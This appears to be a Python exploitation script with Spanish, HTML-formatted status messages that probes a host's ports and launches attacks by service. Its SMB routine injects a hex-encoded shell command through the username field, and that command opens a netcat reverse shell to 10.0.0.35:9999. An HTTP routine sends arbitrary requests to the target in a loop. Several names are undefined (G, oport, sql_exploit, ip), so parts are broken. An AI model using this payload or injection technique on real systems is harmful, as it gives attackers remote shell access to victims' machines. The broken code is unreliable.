import socket, os
import sys
''' from scapy.all import sniff
from scapy.all import * '''
from datetime import datetime

from smb.SMBConnection import SMBConnection
from smb import smb_structs
import string
import requests
# Dataports ->
smbports = [139, 137, 138, 445, 631]
httpports = [80, 8080, 8090]
oports = [22, 2222, 2121, 1234, 4444, 21, 9999]
dataports = [3306, 8027, 8000, 88]
savesports = [443, 442]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket.setdefaulttimeout(1)
sh = os.system

def valider(host):
    exist = sh(f'ping -c1 {host} >> /dev/null')
    if exist == 0:
        print(f"<h6 class='alert alert-success'>[+] El dispositivo esta en linea</h6>")
    else:
        print(f"<h6 class='alert alert-danger'>[-] El dispositivo no existe.</h6>")
        exit()

def saves_exploit(port):
    print(f"<h6 class='alert alert-danger'>[ooo] El puerto {port} no es vulnerable</h6>")
    exit()
def smb_exploit(host, port):
    smb_structs.SUPPORT_SMB2 = False
    buf =  ""
    # Pon tu payload aquí si quieres probar con otro.
    buf += "\x6d\x6b\x66\x69\x66\x6f\x20\x2f\x74\x6d\x70\x2f\x6b"
    buf += "\x62\x67\x61\x66\x3b\x20\x6e\x63\x20\x31\x30\x2e\x30"
    buf += "\x2e\x30\x2e\x33\x35\x20\x39\x39\x39\x39\x20\x30\x3c"
    buf += "\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66\x20\x7c\x20"
    buf += "\x2f\x62\x69\x6e\x2f\x73\x68\x20\x3e\x2f\x74\x6d\x70"
    buf += "\x2f\x6b\x62\x67\x61\x66\x20\x32\x3e\x26\x31\x3b\x20"
    buf += "\x72\x6d\x20\x2f\x74\x6d\x70\x2f\x6b\x62\x67\x61\x66"
    buf += "\x20"
    username = "/= nohup "+buf+"`"
    passwd = ""
    conn = SMBConnection(username, passwd, "test", f"{host}", use_ntlm_v2=False)
    print(f"<h6 class='alert alert-warning'>[ooo] Explotando vulnerabilidad SMB</h6> ")
    assert conn.connect(host, port)
    print(f"<h6 class='alert alert-warning'>[ooo] {host} ha sido explotado exitosamente.</h6>")
def http_exploit(host, port):
    print(f"<h6 class='alert alert-warning'>[ooo] {host} ha sido explotado exitosamente.</h6>")
    print(G+"Utilizar formato {'user': 'test'}")
    sh("touch output.html")
    while True:
        data = input(f"({host}) >> ")
        re = requests.get(f'http://{host}:{port}/{data}')
        f = open('output.html', 'w')
        f.write(re.text)
        f.close()
        print(f"<h6 class='alert alert-success'>[+] Resultado exportado en output.html</h6>")


def exploit(host, port):
    print(f"<h6 class='alert alert-info'>[*] Creando conexión a {host}:{port}</h6>")
    try:
        r = s.connect_ex((host, port))
        if (r == 0):
            print(f"<h6 class='alert alert-success'>[+] Conexión realizada exitosamente.</h6>")
            if (port in  smbports):
                smb_exploit(host, port)
            elif (port in httpports):
                http_exploit(host, port)
            elif (port in oport):
                oport_exploit()
            elif (port in dataports):
                sql_exploit()
            elif (port in savesports):
                saves_exploit(port)
        else:
            print(f"<h6 class='alert alert-danger'>[-] Conexión no posible</h6>")
    except KeyboardInterrupt:
            print(f"Bye bye.")
    except socket.gaierror:
            print(f"<h6 class='alert alert-danger'>El dispositivo {ip} no esta disponible o no tiene internet.</h6>")
            sys.exit()
    except socket.error:
            print(f"<h6 class='alert alert-danger'>Tu dispositivo local no responde !</h6>")
            sys.exit()
 
